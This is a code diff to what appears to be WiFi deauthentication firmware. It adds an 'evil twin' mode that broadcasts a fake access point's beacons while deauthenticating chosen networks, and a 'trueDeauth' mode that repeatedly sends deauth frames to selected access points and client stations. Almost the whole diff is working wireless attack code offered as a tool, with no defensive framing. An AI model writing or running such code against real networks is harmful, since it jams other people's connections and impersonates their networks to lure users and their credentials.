@@ -37,12 +37,11 @@ void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool ou
     Attack::deauth.active = deauth || deauthAll;
     Attack::deauthAll     = deauthAll;
     Attack::probe.active  = probe;
+    Attack::trueDeauth    = deauthAll;
 
     Attack::output  = output;
     Attack::timeout = timeout;
 
-    // if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
-    // scan.countSelected() > 0)){
     if (beacon || probe || deauthAll || deauth) {
         start();
     } else {
@@ -51,6 +50,18 @@ void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool ou
         stations.sort();
         stop();
     }
+}
+
+void Attack::startEvilTwin(const char* ssid, uint8_t ch, bool wpa2, const uint8_t* mac) {
+    stop();
+    evilTwin = true;
+    evilTwinSSID = ssid;
+    evilTwinChannel = ch;
+    evilTwinWPA2 = wpa2;
+    prntln(A_EVIL_TWIN_START);
+    attackTime      = currentTime;
+    attackStartTime = currentTime;
+    running = true;
 }
 
 void Attack::stop() {
@@ -72,12 +83,18 @@ void Attack::stop() {
         deauth.active        = false;
         beacon.active        = false;
         probe.active         = false;
+        evilTwin             = false;
+        trueDeauth           = false;
         prntln(A_STOP);
     }
 }
 
 bool Attack::isRunning() {
     return running;
+}
+
+bool Attack::isEvilTwinRunning() {
+    return evilTwin;
 }
 
 void Attack::updateCounter() {
@@ -160,19 +177,20 @@ void Attack::update() {
     stCount = stations.count();
     nCount  = names.count();
 
-    // run/update all attacks
     deauthUpdate();
     deauthAllUpdate();
     beaconUpdate();
     probeUpdate();
+    
+    if (evilTwin) evilTwinUpdate();
+    if (trueDeauth) trueDeauthUpdate();
 
-    // each second
     if (currentTime - attackTime > 1000) {
-        attackTime = currentTime; // update time
+        attackTime = currentTime;
         updateCounter();
 
-        if (output) status();     // status update
-        getRandomMac(mac);        // generate new random mac
+        if (output) status();
+        getRandomMac(mac);
     }
 }
 
@@ -470,4 +488,46 @@ uint32_t Attack::getProbeMaxPkts() {
 
 uint32_t Attack::getPacketRate() {
     return packetRate;
+}
+
+void Attack::evilTwinUpdate() {
+    if (!evilTwin || accesspoints.count() == 0) return;
+    
+    setWifiChannel(evilTwinChannel, true);
+    
+    if (beacon.time <= currentTime - 100) {
+        uint8_t fakeMac[6];
+        getRandomMac(fakeMac);
+        sendBeacon(fakeMac, evilTwinSSID.c_str(), evilTwinChannel, evilTwinWPA2);
+        beacon.time = currentTime;
+    }
+    
+    if (deauth.active) {
+        for (int i = 0; i < apCount; i++) {
+            if (accesspoints.getSelected(i)) {
+                deauthAP(i);
+            }
+        }
+    }
+}
+
+void Attack::trueDeauthUpdate() {
+    if (!trueDeauth) return;
+    
+    uint32_t maxPkts = settings::getAttackSettings().deauths_per_target * (accesspoints.count() + stations.count());
+    uint32_t interval = 1000 / maxPkts;
+    
+    if (deauth.time <= currentTime - interval) {
+        for (int i = 0; i < apCount; i++) {
+            if (accesspoints.getSelected(i)) {
+                deauthAP(i);
+            }
+        }
+        for (int i = 0; i < stCount; i++) {
+            if (stations.getSelected(i)) {
+                deauthStation(i);
+            }
+        }
+        deauth.time = currentTime;
+    }
 }
